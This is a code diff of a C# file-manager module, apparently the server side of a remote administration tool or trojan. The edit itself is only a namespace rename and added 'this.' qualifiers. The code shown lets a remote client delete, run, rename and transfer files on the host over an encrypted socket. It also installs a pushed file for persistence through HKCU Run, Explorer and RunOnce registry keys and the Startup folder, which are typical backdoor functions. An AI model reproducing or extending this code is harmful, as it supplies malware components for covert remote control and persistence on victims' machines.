@@ -8,7 +8,7 @@ using bc.srv.Classes;
 using bc.srv.Classes.Comunicator;
 using bc.srv.Classes.Image_Classes;
 
-namespace bc.srv.Muduli.File_Manager
+namespace bc.srv.Modules.File_Manager
 {
     internal class FileManAction
     {
@@ -24,15 +24,15 @@ namespace bc.srv.Muduli.File_Manager
 
         public FileManAction(string ctorFile, NetworkStream ctorNet)
         {
-            myNet = ctorNet;
+            this.myNet = ctorNet;
 
             //COSTRUISCO LISTA DI FILE
-            fileNames = ctorFile.Split('*');
+            this.fileNames = ctorFile.Split('*');
         }
 
         public FileManAction(NetworkStream ctorNet)
         {
-            myNet = ctorNet;
+            this.myNet = ctorNet;
         }
 
         /// <summary>
@@ -40,7 +40,7 @@ namespace bc.srv.Muduli.File_Manager
         /// </summary>
         public void StartDelFile()
         {
-            var t = new Thread(DelFile);
+            var t = new Thread(this.DelFile);
             t.IsBackground = true;
             t.Start();
         }
@@ -53,7 +53,7 @@ namespace bc.srv.Muduli.File_Manager
         {
             var error = false;
 
-            foreach (var file in fileNames)
+            foreach (var file in this.fileNames)
                 try
                 {
                     if (Directory.Exists(file))
@@ -73,7 +73,7 @@ namespace bc.srv.Muduli.File_Manager
             else
                 result = "Not All Item(s) successfull Deleted..";
 
-            var mm = new MsgManager(myNet);
+            var mm = new MsgManager(this.myNet);
             mm.SendLargeEncryMessage(result, 10000);
         }
 
@@ -83,9 +83,9 @@ namespace bc.srv.Muduli.File_Manager
         /// </summary>
         public void StartRunFiles(string ctorStartRunMsg)
         {
-            startRunMsg = ctorStartRunMsg;
+            this.startRunMsg = ctorStartRunMsg;
 
-            var t = new Thread(RunFiles);
+            var t = new Thread(this.RunFiles);
             t.IsBackground = true;
             t.Start();
         }
@@ -100,14 +100,14 @@ namespace bc.srv.Muduli.File_Manager
             var normal = true;
             var dosRun = false;
 
-            if (startRunMsg == "DOSRUN")
+            if (this.startRunMsg == "DOSRUN")
                 dosRun = true;
-            else if (startRunMsg == "NORMAL")
+            else if (this.startRunMsg == "NORMAL")
                 normal = true;
             else
                 normal = false;
 
-            foreach (var file in fileNames)
+            foreach (var file in this.fileNames)
                 try
                 {
                     if (File.Exists(file))
@@ -143,7 +143,7 @@ namespace bc.srv.Muduli.File_Manager
             else
                 result = "Not All File(s) successfull Runned..";
 
-            var mm = new MsgManager(myNet);
+            var mm = new MsgManager(this.myNet);
             mm.SendLargeEncryMessage(result, 10000);
         }
         //-------------------------
@@ -154,10 +154,10 @@ namespace bc.srv.Muduli.File_Manager
         /// </summary>
         public void StartRename(string oldFile, string newFile)
         {
-            oldFileRename = oldFile;
-            newFileRename = newFile;
+            this.oldFileRename = oldFile;
+            this.newFileRename = newFile;
 
-            var t = new Thread(RenameFiles);
+            var t = new Thread(this.RenameFiles);
             t.IsBackground = true;
             t.Start();
         }
@@ -173,10 +173,10 @@ namespace bc.srv.Muduli.File_Manager
 
             try
             {
-                if (Directory.Exists(oldFileRename))
-                    Directory.Move(oldFileRename, newFileRename);
-                else if (File.Exists(oldFileRename))
-                    File.Move(oldFileRename, newFileRename);
+                if (Directory.Exists(this.oldFileRename))
+                    Directory.Move(this.oldFileRename, this.newFileRename);
+                else if (File.Exists(this.oldFileRename))
+                    File.Move(this.oldFileRename, this.newFileRename);
                 else
                     error = true;
             }
@@ -193,7 +193,7 @@ namespace bc.srv.Muduli.File_Manager
             else
                 result = "Renaming Item Error..";
 
-            var mm = new MsgManager(myNet);
+            var mm = new MsgManager(this.myNet);
             mm.SendLargeEncryMessage(result, 10000);
         }
         //-------------------------
@@ -204,9 +204,9 @@ namespace bc.srv.Muduli.File_Manager
         /// </summary>
         public void StartNewFolderCration(string ctorNewFold)
         {
-            newFolder = ctorNewFold;
+            this.newFolder = ctorNewFold;
 
-            var t = new Thread(CreateNewFolder);
+            var t = new Thread(this.CreateNewFolder);
             t.IsBackground = true;
             t.Start();
         }
@@ -217,7 +217,7 @@ namespace bc.srv.Muduli.File_Manager
 
             try
             {
-                Directory.CreateDirectory(newFolder);
+                Directory.CreateDirectory(this.newFolder);
             }
             catch
             {
@@ -232,7 +232,7 @@ namespace bc.srv.Muduli.File_Manager
             else
                 result = "Error Creating new Folder..";
 
-            var mm = new MsgManager(myNet);
+            var mm = new MsgManager(this.myNet);
             mm.SendLargeEncryMessage(result, 10000);
         }
 
@@ -242,9 +242,9 @@ namespace bc.srv.Muduli.File_Manager
         /// </summary>
         public void StartImagePreview(string parImageFile)
         {
-            imagePreviewFileName = parImageFile;
+            this.imagePreviewFileName = parImageFile;
 
-            var t = new Thread(SendImagePreview);
+            var t = new Thread(this.SendImagePreview);
             t.IsBackground = true;
             t.Start();
         }
@@ -256,7 +256,7 @@ namespace bc.srv.Muduli.File_Manager
                 //RIDIMENSIONO IMMAGINE PREVIEW 150*150
                 var siz = new Size(150, 150);
                 var iw = new ImageWorker();
-                var original = Image.FromFile(imagePreviewFileName);
+                var original = Image.FromFile(this.imagePreviewFileName);
                 var im = iw.ResizeImage(original, siz);
 
                 var thumbByte = iw.ImgToJpg(im, 50);
@@ -268,12 +268,12 @@ namespace bc.srv.Muduli.File_Manager
                 original.Dispose();
 
                 // INVIO FILE
-                var mfm = new MsgFileManager(myNet);
+                var mfm = new MsgFileManager(this.myNet);
                 var sent = mfm.SendEncryFileByte(thumbByte, 10000);
             }
             catch
             {
-                var mm = new MsgManager(myNet);
+                var mm = new MsgManager(this.myNet);
 
                 var sent = mm.SendMessage("-1|",
                     10000); // MANDO -1 CLIENT RICEVE -1 COME LUNGHEZZA DEL FILE E CAPISCE CHE C'è UN ERRORE
@@ -287,9 +287,9 @@ namespace bc.srv.Muduli.File_Manager
         /// </summary>
         public void StartImageGallery(string parImageFile)
         {
-            imagePreviewFileName = parImageFile;
+            this.imagePreviewFileName = parImageFile;
 
-            var t = new Thread(SendImageGallery);
+            var t = new Thread(this.SendImageGallery);
             t.IsBackground = true;
             t.Start();
         }
@@ -301,7 +301,7 @@ namespace bc.srv.Muduli.File_Manager
                 //RIDIMENSIONO IMMAGINE PREVIEW 150*150
                 var siz = new Size(150, 150);
                 var iw = new ImageWorker();
-                var original = Image.FromFile(imagePreviewFileName);
+                var original = Image.FromFile(this.imagePreviewFileName);
                 var im = iw.ResizeImage(original, siz);
 
                 var thumbByte = iw.ImgToJpg(im, 50);
@@ -312,12 +312,12 @@ namespace bc.srv.Muduli.File_Manager
                 original.Dispose();
 
                 // INVIO FILE
-                var mfm = new MsgFileManager(myNet);
+                var mfm = new MsgFileManager(this.myNet);
                 var sent = mfm.SendEncryFileByte(thumbByte, 10000);
             }
             catch
             {
-                var mm = new MsgManager(myNet);
+                var mm = new MsgManager(this.myNet);
 
                 var sent = mm.SendMessage("-1|",
                     10000); // MANDO -1 CLIENT RICEVE -1 COME LUNGHEZZA DEL FILE E CAPISCE CHE C'è UN ERRORE
@@ -335,13 +335,13 @@ namespace bc.srv.Muduli.File_Manager
             {
                 var fileByte = File.ReadAllBytes(fileName);
 
-                var mfm = new MsgFileManager(myNet);
+                var mfm = new MsgFileManager(this.myNet);
 
                 var sent = mfm.SendEncryFileByte(fileByte, 10000);
             }
             catch
             {
-                var mm = new MsgManager(myNet);
+                var mm = new MsgManager(this.myNet);
 
                 var sent = mm.SendMessage("-1|",
                     10000); // MANDO -1 CLIENT RICEVE -1 COME LUNGHEZZA DEL FILE E CAPISCE CHE C'è UN ERRORE
@@ -357,8 +357,8 @@ namespace bc.srv.Muduli.File_Manager
             try
             {
                 // RISPONDO OK PR AVVISARE CHE SONO PRONTO A RICEVERE E POI RICEVO.. MAVA??
-                var mm = new MsgManager(myNet);
-                var mfm = new MsgFileManager(myNet);
+                var mm = new MsgManager(this.myNet);
+                var mfm = new MsgFileManager(this.myNet);
 
                 var sent = mm.SendEncryMessage("OK", 10000);
 
@@ -387,7 +387,7 @@ namespace bc.srv.Muduli.File_Manager
             }
             catch
             {
-                var mm = new MsgManager(myNet);
+                var mm = new MsgManager(this.myNet);
 
                 var sent = mm.SendMessage("-1|",
                     10000); // MANDO -1 CLIENT RICEVE -1 COME LUNGHEZZA DEL FILE E CAPISCE CHE C'è UN ERRORE
@@ -409,10 +409,10 @@ namespace bc.srv.Muduli.File_Manager
         {
             try
             {
-                sFileToInstall = filePath;
-                sInstallCmd = installCmd;
+                this.sFileToInstall = filePath;
+                this.sInstallCmd = installCmd;
 
-                var t = new Thread(InstallFileAgent);
+                var t = new Thread(this.InstallFileAgent);
                 t.IsBackground = true;
                 t.Start();
             }
@@ -427,22 +427,22 @@ namespace bc.srv.Muduli.File_Manager
         /// </summary>
         private void InstallFileAgent()
         {
-            var mfm = new MsgManager(myNet);
+            var mfm = new MsgManager(this.myNet);
 
             try
             {
                 // CONTROLLO CHE IL FILE ESSITA
-                var fileExist = File.Exists(sFileToInstall);
+                var fileExist = File.Exists(this.sFileToInstall);
 
                 if (!fileExist)
                 {
-                    mfm.SendEncryMessage(string.Format("{0} not exist!", sFileToInstall), 10000);
+                    mfm.SendEncryMessage(string.Format("{0} not exist!", this.sFileToInstall), 10000);
                     return;
                 }
 
 
                 // PARSING DELLA RICHIESTA DI INSTALLAZIONE
-                var installSplit = sInstallCmd.Split('-');
+                var installSplit = this.sInstallCmd.Split('-');
 
                 var result = "";
 
@@ -455,19 +455,19 @@ namespace bc.srv.Muduli.File_Manager
                     {
                         case "HKCU":
                             var rm = new RegistryManager();
-                            var hkcuOk = rm.AddHkcuReg(details[1], sFileToInstall);
+                            var hkcuOk = rm.AddHkcuReg(details[1], this.sFileToInstall);
                             result += string.Format("HKCU-{0}|", hkcuOk);
                             break;
 
                         case "EXPL":
                             var rme = new RegistryManager();
-                            var exploOk = rme.AddExplorerReg(details[1], sFileToInstall);
+                            var exploOk = rme.AddExplorerReg(details[1], this.sFileToInstall);
                             result += string.Format("EXPL-{0}|", exploOk);
                             break;
 
                         case "RUNONC":
                             var rmro = new RegistryManager();
-                            var runOnceOk = rmro.AddHKCURunOnceReg(details[1], sFileToInstall);
+                            var runOnceOk = rmro.AddHKCURunOnceReg(details[1], this.sFileToInstall);
                             result += string.Format("RUNONC-{0}|", runOnceOk);
                             break;
 
@@ -476,7 +476,7 @@ namespace bc.srv.Muduli.File_Manager
                             try
                             {
                                 var startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                                File.Copy(sFileToInstall, Path.Combine(startupFolder, Path.GetFileName(sFileToInstall)),
+                                File.Copy(this.sFileToInstall, Path.Combine(startupFolder, Path.GetFileName(this.sFileToInstall)),
                                     true);
 
                                 result += "FOLD-true|";
